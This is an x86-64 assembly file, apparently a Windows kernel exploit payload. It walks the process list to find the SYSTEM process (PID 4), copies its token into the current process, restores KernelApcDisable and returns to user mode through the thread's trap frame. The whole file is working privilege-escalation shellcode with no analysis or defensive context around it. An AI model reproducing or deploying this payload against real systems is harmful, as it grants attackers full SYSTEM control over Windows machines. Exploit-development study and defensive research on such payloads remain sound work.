global _start

_start:
    push 0x18                       ; offset
    pop rdx                         ; $rdx = 0x18
    push 0x5c                       ; offset
    pop rcx                         ; $rcx = 0x5c

    mov r11, [gs:rdx + rcx * 4]     ; $r11 = _KTHREAD
    mov rax, [r11 + rcx * 2]        ; $rax = _EPROCESS

    push rax                        ; $rsp = _EPROCESS
    pop rbx                         ; $rbx = _EPROCESS

    add dx, 0x430                   ; $rdx = 0x448

    .loop:
        mov rbx, [rbx + rdx]        ; $rbx = ActiveProcessLinks
        sub rbx, rdx                ; $rbx = _EPROCESS
        mov ecx, [rbx - 0x8 + rdx]  ; $ecx = PID
        cmp ecx, 0x4                ; cmp PID to SYSTEM PID
        jnz .loop                   ; if zf == 0 -> loop

    mov rcx, [rbx + 0x70 + rdx]     ; $rcx = SYSTEM token
    and cl, 0xf0                    ; clear _EX_FAST_REF struct
    mov [rax + 0x70 + rdx], rcx     ; store SYSTEM token in _EPROCESS

    xchg rax, r11                   ; $rax = _KTHREAD
    sub dx, 0x264                   ; $rdx = 0x1e4

    mov cx, [rax + rdx]             ; $cx = KernelApcDisable
    inc cx                          ; fix value
    mov [rax + rdx], cx             ; restore value

    push 0x48                       ; offset
    pop rcx                         ; $rcx = 0x48

    mov rdx, [rax + 0x00 + rcx * 2] ; $rdx = ETHREAD.TrapFrame
    mov rbp, [rdx + 0x38 + rcx * 4] ; $rbp = ETHREAD.TrapFrame.Rbp
    mov r11, [rdx + 0x58 + rcx * 4] ; $r11 = ETHREAD.TrapFrame.EFlags
    mov rsp, [rdx + 0x60 + rcx * 4] ; $rsp = ETHREAD.TrapFrame.Rsp
    mov rcx, [rdx + 0x48 + rcx * 4] ; $rcx = ETHREAD.TrapFrame.Rip

    xor eax, eax                    ; $eax = STATUS SUCCESS
    swapgs                          ; swap gs segment
    o64 sysret                      ; return to usermode
